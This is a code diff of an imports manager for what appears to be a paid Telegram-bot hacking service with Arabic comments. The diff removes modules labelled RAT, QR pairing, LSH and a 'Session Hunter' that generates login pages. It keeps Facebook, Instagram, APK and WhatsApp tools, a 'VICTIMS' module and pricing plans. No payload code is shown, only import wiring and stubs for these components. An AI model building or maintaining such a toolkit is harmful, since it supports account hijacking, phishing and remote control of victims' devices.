@@ -1,6 +1,7 @@
 # imports_manager.py
 # ============================================================
 # استيراد كل الأدوات مع Fallback آمن
+# v7 — بعد حذف RAT / QR / LSH / SH
 # ============================================================
 
 import io
@@ -31,107 +32,6 @@ try:
 except Exception as e:
     logger.error(f"instagram_module: {e}")
     init_instagram_routes = lambda app, bot: None
-
-
-# ============================================================
-# RAT
-# ============================================================
-try:
-    from rat_module import init_rat_routes, rat_bp, queue_command
-    logger.info("[+] rat_module imported")
-except Exception as e:
-    logger.error(f"rat_module: {e}")
-    init_rat_routes = lambda app, bot: None
-    rat_bp = None
-    queue_command = lambda *args: None
-
-
-# ============================================================
-# QR
-# ============================================================
-try:
-    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
-    logger.info("[+] qr_pairing imported")
-except Exception as e:
-    logger.error(f"qr_pairing: {e}")
-    init_qr_routes = lambda app, bot: None
-    qr_bp = None
-    generate_qr_code_bytes = lambda *args: None
-
-
-# ============================================================
-# LSH
-# ============================================================
-try:
-    from lsh import (
-        init_lsh_routes, lsh_bp,
-        generate_qr_code_bytes as lsh_generate_qr,
-        set_bot_reference,
-        push_command as lsh_push_command,
-        get_session as lsh_get_session,
-        build_lsh_control_panel,
-    )
-    LSH_ENABLED = True
-    logger.info("[+] lsh imported")
-except Exception as e:
-    logger.exception(f"lsh: {e}")
-    LSH_ENABLED = False
-
-    def init_lsh_routes(app, bot):
-        pass
-
-    def set_bot_reference(bot):
-        pass
-
-    def lsh_push_command(*a, **kw):
-        return False
-
-    def lsh_get_session(*a, **kw):
-        return None
-
-    def lsh_generate_qr(*a, **kw):
-        return io.BytesIO()
-
-    def build_lsh_control_panel(*a, **kw):
-        return InlineKeyboardMarkup()
-
-    lsh_bp = None
-
-
-# ============================================================
-# Session Hunter
-# ============================================================
-try:
-    from session_hunter import (
-        init_session_hunter_routes, sh_bp, get_sh_data,
-        build_sh_panel, SUPPORTED_SITES,
-        create_session as sh_create_session,
-        generate_login_page as sh_generate_login_page,
-    )
-    SH_ENABLED = True
-    logger.info("[+] session_hunter imported")
-except Exception as e:
-    logger.error(f"session_hunter: {e}")
-    SH_ENABLED = False
-
-    def init_session_hunter_routes(app, bot):
-        pass
-
-    sh_bp = None
-
-    def get_sh_data(sid):
-        return {}
-
-    def build_sh_panel(sid, cid):
-        return InlineKeyboardMarkup()
-
-    SUPPORTED_SITES = {}
-
-    def sh_create_session(*a, **kw):
-        return None
-
-    def sh_generate_login_page(*a, **kw):
-        return "Error"
 
 
 # ============================================================
@@ -325,7 +225,7 @@ except Exception as e:
 
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 3
-    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "apk", "wa"]
+    AVAILABLE_TOOLS = ["fb", "ig", "apk", "wa"]
 
     def is_admin(uid):
         return False
@@ -378,10 +278,8 @@ except Exception as e:
 # ============================================================
 logger.info(
     f"Imports Summary | "
-    f"LSH={LSH_ENABLED} | "
-    f"SH={SH_ENABLED} | "
     f"WA={WA_ENABLED} | "
     f"APK_MGR={APK_MANAGER_ENABLED} | "
     f"VICTIMS={VICTIMS_ENABLED} | "
     f"PAYMENT={PAYMENT_ENABLED}"
-    )
+)
